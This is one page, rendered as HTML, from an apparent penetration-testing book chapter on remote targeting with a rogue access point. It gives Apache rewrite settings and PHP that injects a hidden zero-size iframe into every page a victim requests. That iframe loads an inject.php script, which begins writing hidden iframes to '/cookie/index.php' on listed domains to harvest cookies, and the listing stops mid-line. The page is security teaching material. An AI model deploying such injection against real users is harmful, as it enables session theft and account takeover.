<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf11c" class="pf w2 h2" data-page-no="11c"><div class="pc pc11c w2 h2"><div class="t m0 xa3 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 7: Phase III: Remote T<span class="_ _0"/>argeting<span class="_ _9"> </span><span class="ff1 fs9 lsa">261</span></div><div class="t m0 x3 h44 yb3f fff fse fc0 sc0 ls0 ws0">root@kali:/# a2enmod rewrite</div><div class="t m0 x3 h44 yb40 fff fse fc0 sc0 ls0 ws0">To activate the new configuration, you need to run:</div><div class="t m0 x3 h44 yb41 fff fse fc0 sc0 ls0 ws0">  service apache2 restart</div><div class="t m0 x3 h44 yb42 fff fse fc0 sc0 ls0 ws0">root@kali:/#</div><div class="t m0 x4 hd y1b43 ff4 fs7 fc0 sc0 ls0 ws0">As in the discussion of PHP-phoxy<span class="_ _2"/>, we need to change the conguration directiv<span class="_ _0"/>e </div><div class="t m0 x3 hd y1b44 ff4 fs7 fc0 sc0 ls0 ws0">“<span class="_ _3"/>AllowOverride None” to “<span class="_ _3"/>Allo<span class="_ _0"/>wOverride <span class="_ _2"/>All” in the <span class="_ _0"/>Apache conguration le. </div><div class="t m0 x3 hd y1b45 ff4 fs7 fc0 sc0 ls0 ws0">Once this is set, create the .htacess le in /v<span class="_ _0"/>ar/www/ with the following contents:</div><div class="t m0 x3 h44 y1b46 fff fse fc0 sc0 ls0 ws0">Options +FollowSymLinks</div><div class="t m0 x3 h44 y1b47 fff fse fc0 sc0 ls0 ws0">RewriteEngine on</div><div class="t m0 x3 h44 y1b48 fff fse fc0 sc0 ls0 ws0">RewriteCond %{REQUEST_FILENAME} !-f</div><div class="t m0 x3 h44 y1b49 fff fse fc0 sc0 ls0 ws0">RewriteCond %{REQUEST_FILENAME} !-d</div><div class="t m0 x3 h44 y1b4a fff fse fc0 sc0 ls0 ws0">RewriteRule .* /index.php [L]</div><div class="t m0 x4 hd y1b4b ff4 fs7 fc0 sc0 ls0 ws0">These re<span class="_ _0"/>write conditions redirect any requested URI that does not e<span class="_ _0"/>xist to the </div><div class="t m0 x3 hd y1b4c ff4 fs7 fc0 sc0 ls0 ws0">index.phple. <span class="_ _0"/>Thus, all of our primary processing will be done in index.php, and </div><div class="t m0 x3 hd y1b4d ff4 fs7 fc0 sc0 ls0 ws0">we can really choose what the user’<span class="_ _2"/>s experience will be by changing this le. The </div><div class="t m0 x3 hd y1b4e ff4 fs7 fc0 sc0 ls0 ws0">default inde<span class="_ _0"/>x.php le that comes with the <span class="_ _0"/>APT<span class="_ _1b"/>-Rogue-AP package will proxy the </div><div class="t m0 x3 hd y1b4f ff4 fs7 fc0 sc0 ls0 ws0">user’<span class="_ _2"/>s request and inject our malicious payloads.</div><div class="t m0 x4 hd y1b50 ff4 fs7 fc0 sc0 ls0 ws0">Ho<span class="_ _0"/>wev<span class="_ _0"/>er<span class="_ _0"/>, another common approach is to display a splash screen and ha<span class="_ _0"/>ve the </div><div class="t m0 x3 hd y1b51 ff4 fs7 fc0 sc0 ls0 ws0">user log in while simultaneously performing the same injection attacks. Currently<span class="_ _2"/>, </div><div class="t m0 x3 hd y1b52 ff4 fs7 fc0 sc0 ls0 ws0">two e<span class="_ _0"/>xample splash pages come with <span class="_ _0"/>ARAP: Google_splash.php and F<span class="_ _0"/>acebook_</div><div class="t m0 x3 hd y1b53 ff4 fs7 fc0 sc0 ls0 ws0">splash.php. The inject.php le handles all of our injection tasks. <span class="_ _0"/>W<span class="_ _3"/>e simply nd a </div><div class="t m0 x3 hd y1b54 ff4 fs7 fc0 sc0 ls0 ws0">way to include it in the HTML le the user requests, and the inject.php handles </div><div class="t m0 x3 hd y1b55 ff4 fs7 fc0 sc0 ls0 ws0">the rest.</div><div class="t m0 x4 hd y1b56 ff4 fs7 fc0 sc0 ls0 ws0">There are many dif<span class="_ _0"/>ferent ways for us to include inject.php. <span class="_ _0"/>The default method </div><div class="t m0 x3 hd y1b57 ff4 fs7 fc0 sc0 ls0 ws0">is to replace the closing &lt;body&gt; tag in all requested pages with a hidden iframe that </div><div class="t m0 x3 hd y1b58 ff4 fs7 fc0 sc0 ls0 ws0">includes the inject.php le. This is sho<span class="_ _0"/>wn in the follo<span class="_ _0"/>wing code segment:</div><div class="t m0 x3 h44 y1b59 fff fse fc0 sc0 ls0 ws0">$injectSearch = "&lt;/body&gt;";</div><div class="t m0 x3 h44 y1b5a fff fse fc0 sc0 ls0 ws0">$injectReplace = "&lt;iframe src='inject.php' width='0' height='0' </div><div class="t m0 x3 h44 y1b5b fff fse fc0 sc0 ls0 ws0">tabindex='-1' title='empty'&gt;&lt;/iframe&gt;&lt;/body&gt;";</div><div class="t m0 x3 h44 y1b5c fff fse fc0 sc0 ls0 ws0">$body = str_replace($injectSearch,$injectReplace,$body);</div><div class="t m0 x4 hd y1b5d ff4 fs7 fc0 sc0 ls0 ws0">Here is an example of the inject.php le included with <span class="_ _2"/>ARAP: </div><div class="t m0 x3 h44 y1b5e fff fse fc0 sc0 ls0 ws0">&lt;?php</div><div class="t m0 x3 h44 y1b5f fff fse fc0 sc0 ls0 ws0">$domainListFile = "domains.in.txt";</div><div class="t m0 x3 h44 y1b60 fff fse fc0 sc0 ls0 ws0">$domainList = fopen( $domainListFile, "r");</div><div class="t m0 x3 h44 y1b61 fff fse fc0 sc0 ls0 ws0">if ($domainList) {</div><div class="t m0 x3 h44 y1b62 fff fse fc0 sc0 ls0 ws0">    while (($line = fgets($domainList)) !== false) {</div><div class="t m0 x66 h44 y1b63 fff fse fc0 sc0 ls0 ws0">echo "&lt;iframe src=‘http://$line/cookie/index.php’ width='0' </div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>